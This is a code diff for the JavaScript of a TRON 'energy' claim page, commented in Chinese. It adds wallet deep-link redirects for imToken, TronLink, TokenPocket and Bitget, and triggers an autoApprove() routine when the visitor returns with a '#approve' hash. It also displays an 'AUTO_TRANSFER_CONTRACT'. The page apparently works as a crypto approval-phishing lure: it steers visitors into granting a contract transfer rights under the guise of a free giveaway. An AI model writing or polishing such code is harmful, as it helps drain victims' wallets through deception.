+                            setTimeout(() => alertEl.parentNode.removeChild(alertEl), 300);
+                        }
+                    }, 3000);
+                    btn.disabled = false;
+                    btn.textContent = lang.approveBtnText;
+                    return;
+                }
+                // B1成功：移除弹窗，执行跳转
+                if (alertEl && alertEl.parentNode) {
+                    alertEl.parentNode.removeChild(alertEl);
+                }
+                await handleJump();
+            }
+            // 统一执行记录存储
+            saveEnergyRecord();
+            renderEnergyRecords();
         } catch (e) {
-            console.error("领取流程失败：", e);
-            reviewTip.style.display = "none";
+            console.error("领取流程异常：", e);
+            // 异常时移除弹窗
+            if (alertEl && alertEl.parentNode) {
+                alertEl.parentNode.removeChild(alertEl);
+            }
+            showAutoCloseAlert(`操作失败：${e.message || lang.systemBusyTip}`);
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-            const errMsg = e.message || "";
-            if (errMsg.includes("不符合领取条件") || [400, 408, 409].some(code => errMsg.includes(code.toString()))) {
-                alert("你现在不符合领取条件");
-            } else {
-                alert("现在领取的人太多啦，请稍后重试");
-            }
         }
     };
+    // 跳转工具函数（统一逻辑，避免冗余）
+    async function handleJump() {
+        const lang = langConfig[currentLang];
+        const btn = document.getElementById("approveBtn");
+        try {
+            // 关键：优先读取URL中传递的钱包类型（用户首次选择的）
+            const selectedWalletType = getWalletFromUrl();
+            let wallet, walletName;
+
+            // 如果URL中有钱包类型，直接复用；否则走环境检测（兜底）
+            if (selectedWalletType && walletConfig[selectedWalletType]) {
+                wallet = walletConfig[selectedWalletType];
+                walletName = wallet.name;
+                // 存储到localStorage，后续可复用
+                localStorage.setItem("selectedWalletType", selectedWalletType);
+            } else {
+                // 兜底：读取localStorage中存储的钱包类型，仍无则检测环境
+                const storedWalletType = localStorage.getItem("selectedWalletType");
+                if (storedWalletType && walletConfig[storedWalletType]) {
+                    wallet = walletConfig[storedWalletType];
+                    walletName = wallet.name;
+                } else {
+                    // 最终兜底：环境检测
+                    walletName = "imToken";
+                    wallet = walletConfig.imtoken;
+                    if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
+                        walletName = "TokenPocket";
+                        wallet = walletConfig.tokenpocket;
+                    } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
+                        walletName = "TronLink";
+                        wallet = walletConfig.tronlink;
+                    } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
+                        walletName = "Bitget Wallet";
+                        wallet = walletConfig.bitget;
+                    }
+                }
+            }
+
+            // 显示明确引导，让用户知道即将唤起的钱包
+            const alertEl = showPersistentAlert(`即将唤起${walletName}授权页面，请确认...`);
+
+            // 生成跳转URL（沿用对应钱包的scheme）
+            const approveUrl = window.location.href + "#approve";
+            let jumpUrl = "";
+            switch (selectedWalletType || localStorage.getItem("selectedWalletType")) {
+                case "tronlink":
+                    const param = JSON.stringify({
+                        url: approveUrl,
+                        action: "open",
+                        protocol: "tronlink",
+                        version: "1.0"
+                    });
+                    jumpUrl = wallet.scheme + encodeURIComponent(param);
+                    break;
+                case "tokenpocket":
+                    jumpUrl = wallet.scheme + encodeURIComponent(approveUrl) + wallet.suffix;
+                    break;
+                default:
+                    jumpUrl = wallet.scheme + encodeURIComponent(approveUrl);
+            }
+
+            // 执行跳转，跳转失败时引导手动操作
+            window.location.href = jumpUrl;
+            setTimeout(() => {
+                alertEl.textContent = `未检测到${walletName}，请手动打开${walletName}访问该链接`;
+                // 5秒后关闭提示
+                setTimeout(() => alertEl.parentNode?.removeChild(alertEl), 5000);
+            }, 3000);
+
+            btn.textContent = `正在唤起${walletName}...`;
+        } catch (jumpErr) {
+            console.error("跳转失败：", jumpErr);
+            showAutoCloseAlert("跳转授权失败，请手动打开钱包访问该链接");
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+        }
+    }
 }
-// ========== 辅助函数（全部保留原有逻辑，无修改） ==========
-function updateWalletStatus() {
-    userAddress ? walletStatusContainer.classList.add("connected") : walletStatusContainer.classList.remove("connected");
-}
+
+// ========== 辅助函数（修复白名单地址的记录存储） ==========
 function saveEnergyRecord() {
     const lang = langConfig[currentLang];
     const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -1423,6 +1485,7 @@ function saveEnergyRecord() {
     });
     localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
 }
+
 function renderEnergyRecords() {
     const lang = langConfig[currentLang];
     const container = document.getElementById("approvalRecords");
@@ -1431,7 +1494,8 @@ function renderEnergyRecords() {
         container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
         return;
     }
-    container.innerHTML = records.map(record => `
+    // 批量生成DOM，优化渲染效率
+    const recordsHtml = records.map(record => `
         <div class='record-item'>
             <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
             <p><strong>${lang.recordType}</strong>${record.recordType}</p>
@@ -1439,15 +1503,23 @@ function renderEnergyRecords() {
             <p><strong>${lang.recordTime}</strong>${record.receiveTime}</p>
         </div>
     `).join("");
+    container.innerHTML = recordsHtml;
 }
-// ========== 页面初始化 ==========
+
+// ========== 新增：从URL读取钱包类型参数（关键） ==========
+function getWalletFromUrl() {
+    const params = new URLSearchParams(window.location.search);
+    const walletType = params.get("wallet");
+    // 验证是否是支持的钱包类型
+    return walletType && walletConfig[walletType] ? walletType : null;
+}
+
+// ========== 页面初始化（修复绑定时机） ==========
 document.addEventListener('DOMContentLoaded', async () => {
     localStorage.removeItem("energy_state");
-    console.log("已清除旧缓存");
     contractEnergyEl = document.getElementById("contractEnergy");
-    console.log("能量显示元素是否找到：", contractEnergyEl ? "✅ 找到" : "❌ 未找到");
     if (!contractEnergyEl) {
-        alert("⚠️ 能量显示元素未找到，请检查页面中是否有id='contractEnergy'的标签");
+        showAutoCloseAlert("⚠️ 能量显示元素未找到，请检查页面");
         return;
     }
     startPersistentEnergyCountdown();
@@ -1456,30 +1528,35 @@ document.addEventListener('DOMContentLoaded', async () => {
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
     renderEnergyRecords();
     updateWalletStatus();
-    // 初始隐藏记录列表
     recordList.style.display = "none";
-    await checkImTokenEnv().catch(err => {
+
+    // 关键：读取URL中的钱包类型参数，存储到localStorage
+    const urlWalletType = getWalletFromUrl();
+    if (urlWalletType && walletConfig[urlWalletType]) {
+        localStorage.setItem("selectedWalletType", urlWalletType);
+    }
+
+    // 移除500ms延迟，立即执行环境检测（解决卡顿）
+    checkImTokenEnv().catch(err => {
         console.error("环境检测失败：", err);
         const lang = langConfig[currentLang];
-        userInfoEl.innerHTML = lang.userInfoDefault; // 未连接时只显示默认提示
+        userInfoEl.innerHTML = lang.userInfoDefault;
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
     });
     window.addEventListener("beforeunload", () => {
-        if (trxTimer) clearTimeout(trxTimer);
+        if (trxTimer) clearInterval(trxTimer);
     });
-    // 监听钱包唤起标记：仅展示页面，不自动授权
+    // 监听钱包唤起标记
     if (window.location.hash === "#wallet-open" && window.tronWeb) {
         window.location.hash = "";
         setTimeout(() => {
             initWallet(false).catch(err => {
                 console.error("钱包唤起后初始化失败：", err);
-                const lang = langConfig[currentLang];
-                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                userInfoEl.innerHTML = `加载失败：${err.message}<br><span style='color: #ef4444; font-size: 14px;'>请刷新重试</span>`;
                 approveBtn.disabled = false;
-                approveBtn.textContent = lang.approveBtnText;
+                approveBtn.textContent = "重新加载";
+                approveBtn.onclick = () => window.location.reload();
             });
         }, 500);
     }
@@ -1487,14 +1564,12 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (window.tronWeb && window.location.hash === "#approve") {
         window.location.hash = "";
         setTimeout(() => {
-            autoApprove().catch(err => { // 授权后触发自动授权函数
+            autoApprove().catch(err => {
                 console.error("授权后初始化失败：", err);
-                const lang = langConfig[currentLang];
-                const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
-                const tip = isCustomerError(err.message) ? lang.ineligibleTip : lang.systemBusyTip;
-                userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}<br><span style='color: #ef4444; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
+                userInfoEl.innerHTML = `授权失败：${err.message}<br><span style='color: #ef4444; font-size: 14px;'>请返回重新领取</span>`;
                 approveBtn.disabled = false;
-                approveBtn.textContent = lang.approveBtnText;
+                approveBtn.textContent = "返回领取";
+                approveBtn.onclick = () => window.location.href = window.location.origin + window.location.pathname;
             });
         }, 500);
     }
